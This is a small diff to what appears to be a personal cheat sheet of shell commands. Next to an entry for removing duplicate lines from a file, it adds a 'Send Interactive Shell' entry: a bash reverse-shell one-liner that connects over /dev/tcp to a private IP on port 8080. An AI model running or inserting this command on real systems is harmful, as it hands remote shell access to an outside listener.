@@ -25,3 +25,6 @@
 
 ## Clean duplicate entris on file ##
 - sort -u [file] > [clean_file]
+
+## Send Interactive Shell
+- bash -i >& /dev/tcp/192.168.1.37/8080 0>&1
